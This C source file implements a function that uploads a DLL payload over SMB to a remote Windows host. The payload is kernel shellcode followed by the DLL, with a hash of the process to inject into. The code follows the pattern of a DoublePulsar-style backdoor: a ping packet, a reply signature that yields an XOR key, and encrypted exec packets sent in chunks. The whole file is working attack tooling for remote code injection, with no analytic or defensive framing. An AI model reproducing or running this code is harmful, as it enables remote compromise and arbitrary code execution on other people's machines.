#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

static int upload_send_all(SOCKET sock, const uint8_t *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = send(sock, (const char *)data + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }
    return 0;
}

static int upload_recv_exact(SOCKET sock, uint8_t *data, size_t length)
{
    size_t received = 0;

    while (received < length) {
        size_t remaining = length - received;
        int amount = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(sock, (char *)data + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }
    return 0;
}

static int upload_recv_smb_response(SOCKET sock, uint8_t **response, size_t *response_length)
{
    uint8_t header[4];
    uint32_t body_length;
    uint8_t *buffer;

    *response = NULL;
    *response_length = 0;

    if (upload_recv_exact(sock, header, sizeof(header)) != 0)
        return -1;

    body_length = ((uint32_t)header[1] << 16) |
                  ((uint32_t)header[2] << 8) |
                  (uint32_t)header[3];
    if (body_length == 0)
        return -1;

    buffer = (uint8_t *)malloc((size_t)body_length + sizeof(header));
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (upload_recv_exact(sock, buffer + sizeof(header), body_length) != 0) {
        free(buffer);
        return -1;
    }

    *response = buffer;
    *response_length = (size_t)body_length + sizeof(header);
    return 0;
}

static void upload_xor_buffer(uint8_t *buffer, size_t length, uint32_t key)
{
    size_t i;

    for (i = 0; i < length; ++i)
        buffer[i] ^= (uint8_t)(key >> ((i & 3U) * 8U));
}

static void upload_write_le16(uint8_t *buffer, uint16_t value)
{
    buffer[0] = (uint8_t)value;
    buffer[1] = (uint8_t)(value >> 8);
}

static void upload_write_le32(uint8_t *buffer, uint32_t value)
{
    buffer[0] = (uint8_t)value;
    buffer[1] = (uint8_t)(value >> 8);
    buffer[2] = (uint8_t)(value >> 16);
    buffer[3] = (uint8_t)(value >> 24);
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    SOCKET sock = INVALID_SOCKET;
    HANDLE file = INVALID_HANDLE_VALUE;
    struct sockaddr_in address;
    LARGE_INTEGER file_size;
    uint8_t *dll_data = NULL;
    uint8_t *payload = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    size_t dll_length = 0;
    size_t payload_length = 0;
    uint16_t user_id;
    uint16_t tree_id;
    uint32_t sig;
    uint32_t key;
    uint32_t inject_hash = 0;
    const unsigned char *process_name;
    DWORD bytes_read;
    int wsa_started = 0;
    int result = -1;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;

    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        return -1;
    wsa_started = 1;

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        goto cleanup;

    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (unsigned long long)file_size.QuadPart > (unsigned long long)SIZE_MAX ||
        (unsigned long long)file_size.QuadPart > (unsigned long long)(UINT32_MAX - 3978U))
        goto cleanup;

    dll_length = (size_t)file_size.QuadPart;
    if (dll_length != 0) {
        dll_data = (uint8_t *)malloc(dll_length);
        if (dll_data == NULL)
            goto cleanup;
    }

    {
        size_t offset = 0;
        while (offset < dll_length) {
            size_t remaining = dll_length - offset;
            DWORD amount = remaining > (size_t)MAXDWORD ? MAXDWORD : (DWORD)remaining;
            if (!ReadFile(file, dll_data + offset, amount, &bytes_read, NULL) ||
                bytes_read == 0)
                goto cleanup;
            offset += (size_t)bytes_read;
        }
    }

    if (!CloseHandle(file)) {
        file = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    file = INVALID_HANDLE_VALUE;

    if (dll_length > (size_t)(UINT32_MAX - (uint32_t)KERNEL_RUNDLL_SIZE) ||
        dll_length > SIZE_MAX - (size_t)KERNEL_RUNDLL_SIZE)
        goto cleanup;
    payload_length = (size_t)KERNEL_RUNDLL_SIZE + dll_length;
    if (payload_length > UINT32_MAX)
        goto cleanup;

    if ((size_t)KERNEL_RUNDLL_TOTAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_TOTAL_OFFSET < 4U ||
        (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET < 4U ||
        (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET < 4U ||
        (size_t)KERNEL_RUNDLL_HASH_OFFSET > (size_t)KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_SIZE - (size_t)KERNEL_RUNDLL_HASH_OFFSET < 4U)
        goto cleanup;

    payload = (uint8_t *)malloc(payload_length == 0 ? 1 : payload_length);
    if (payload == NULL)
        goto cleanup;

    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, (size_t)KERNEL_RUNDLL_SIZE);
    if (dll_length != 0)
        memcpy(payload + (size_t)KERNEL_RUNDLL_SIZE, dll_data, dll_length);

    upload_write_le32(payload + (size_t)KERNEL_RUNDLL_TOTAL_OFFSET,
                      (uint32_t)dll_length + 3978U);
    upload_write_le32(payload + (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET,
                      (uint32_t)dll_length);
    upload_write_le32(payload + (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET, 1U);

    process_name = (const unsigned char *)TARGET_INJECT_PROCESS;
    while (*process_name != '\0') {
        inject_hash = inject_hash * 127U + (uint32_t)*process_name;
        ++process_name;
    }
    upload_write_le32(payload + (size_t)KERNEL_RUNDLL_HASH_OFFSET, inject_hash);

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
        goto cleanup;
    if (connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    if (upload_send_all(sock, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1U) != 0 ||
        upload_recv_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (upload_send_all(sock, SMB_SESSION_SETUP_PKT,
                        sizeof(SMB_SESSION_SETUP_PKT) - 1U) != 0 ||
        upload_recv_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34U)
        goto cleanup;
    user_id = (uint16_t)response[32] | ((uint16_t)response[33] << 8);
    free(response);
    response = NULL;

    {
        uint8_t *tree_packet;
        size_t tree_packet_length = sizeof(SMB_TREE_CONNECT_PKT) - 1U;

        if (tree_packet_length < 34U)
            goto cleanup;
        tree_packet = (uint8_t *)malloc(tree_packet_length);
        if (tree_packet == NULL)
            goto cleanup;
        memcpy(tree_packet, SMB_TREE_CONNECT_PKT, tree_packet_length);
        upload_write_le16(tree_packet + 32U, user_id);

        if (upload_send_all(sock, tree_packet, tree_packet_length) != 0) {
            free(tree_packet);
            goto cleanup;
        }
        free(tree_packet);
    }

    if (upload_recv_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 30U)
        goto cleanup;
    tree_id = (uint16_t)response[28] | ((uint16_t)response[29] << 8);
    free(response);
    response = NULL;

    {
        uint8_t *ping_packet;
        size_t ping_packet_length = sizeof(DP_PING_PKT) - 1U;

        if (ping_packet_length < 34U)
            goto cleanup;
        ping_packet = (uint8_t *)malloc(ping_packet_length);
        if (ping_packet == NULL)
            goto cleanup;
        memcpy(ping_packet, DP_PING_PKT, ping_packet_length);
        upload_write_le16(ping_packet + 28U, tree_id);
        upload_write_le16(ping_packet + 32U, user_id);

        if (upload_send_all(sock, ping_packet, ping_packet_length) != 0) {
            free(ping_packet);
            goto cleanup;
        }
        free(ping_packet);
    }

    if (upload_recv_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;
    if ((size_t)SMB_RESP_SIGNATURE_START > response_length ||
        response_length - (size_t)SMB_RESP_SIGNATURE_START < 4U)
        goto cleanup;

    sig = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1U] << 8) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2U] << 16) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3U] << 24);
    key = 2U * sig ^
          ((((sig >> 16) | (sig & 0xFF0000U)) >> 8) |
           (((sig << 16) | (sig & 0xFF00U)) << 8));
    free(response);
    response = NULL;

    upload_xor_buffer(payload, payload_length, key);

    {
        size_t offset = 0;

        while (offset < payload_length) {
            size_t remaining = payload_length - offset;
            size_t chunk_size = remaining > (size_t)SMB_EXEC_SHELLCODE_LEN
                                    ? (size_t)SMB_EXEC_SHELLCODE_LEN
                                    : remaining;
            size_t packet_length = (size_t)SMB_EXEC_TEMPLATE_LEN + 12U + chunk_size;
            uint8_t *packet;
            uint32_t total_parameter = (uint32_t)payload_length ^ key;
            uint32_t chunk_parameter = (uint32_t)chunk_size ^ key;
            uint32_t offset_parameter = (uint32_t)offset ^ key;
            size_t netbios_offset = (size_t)SMB_NETBIOS_LEN_OFFSET;

            if (chunk_size > UINT16_MAX || chunk_size + 12U > UINT16_MAX ||
                packet_length < (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_TEMPLATE_LEN > sizeof(DP_EXEC_PKT) - 1U ||
                netbios_offset > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_TEMPLATE_LEN - netbios_offset < 3U ||
                (size_t)SMB_EXEC_TOTAL_DATA_OFFSET + 2U > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_DATA_COUNT_OFFSET + 2U > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_EXEC_BYTE_COUNT_OFFSET + 2U > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_TID_OFFSET + 2U > (size_t)SMB_EXEC_TEMPLATE_LEN ||
                (size_t)SMB_UID_OFFSET + 2U > (size_t)SMB_EXEC_TEMPLATE_LEN)
                goto cleanup;

            packet = (uint8_t *)malloc(packet_length);
            if (packet == NULL)
                goto cleanup;

            memcpy(packet, DP_EXEC_PKT, (size_t)SMB_EXEC_TEMPLATE_LEN);
            packet[netbios_offset] =
                (uint8_t)((chunk_size + (size_t)SMB_EXEC_TEMPLATE_LEN + 12U - 4U) >> 16);
            packet[netbios_offset + 1U] =
                (uint8_t)((chunk_size + (size_t)SMB_EXEC_TEMPLATE_LEN + 12U - 4U) >> 8);
            packet[netbios_offset + 2U] =
                (uint8_t)(chunk_size + (size_t)SMB_EXEC_TEMPLATE_LEN + 12U - 4U);

            upload_write_le16(packet + (size_t)SMB_EXEC_TOTAL_DATA_OFFSET,
                              (uint16_t)chunk_size);
            upload_write_le16(packet + (size_t)SMB_EXEC_DATA_COUNT_OFFSET,
                              (uint16_t)chunk_size);
            upload_write_le16(packet + (size_t)SMB_EXEC_BYTE_COUNT_OFFSET,
                              (uint16_t)(chunk_size + 12U));
            upload_write_le16(packet + (size_t)SMB_TID_OFFSET, tree_id);
            upload_write_le16(packet + (size_t)SMB_UID_OFFSET, user_id);

            upload_write_le32(packet + (size_t)SMB_EXEC_TEMPLATE_LEN, total_parameter);
            upload_write_le32(packet + (size_t)SMB_EXEC_TEMPLATE_LEN + 4U,
                              chunk_parameter);
            upload_write_le32(packet + (size_t)SMB_EXEC_TEMPLATE_LEN + 8U,
                              offset_parameter);
            memcpy(packet + (size_t)SMB_EXEC_TEMPLATE_LEN + 12U,
                   payload + offset, chunk_size);

            if (upload_send_all(sock, packet, packet_length) != 0) {
                free(packet);
                goto cleanup;
            }
            free(packet);

            if (upload_recv_smb_response(sock, &response, &response_length) != 0)
                goto cleanup;
            if ((size_t)DP_RESP_MUX_ID_OFFSET >= response_length ||
                response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC)
                goto cleanup;
            free(response);
            response = NULL;

            offset += chunk_size;
        }
    }

    result = 0;

cleanup:
    if (response != NULL)
        free(response);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    if (file != INVALID_HANDLE_VALUE)
        CloseHandle(file);
    free(dll_data);
    free(payload);
    if (wsa_started)
        WSACleanup();
    return result;
}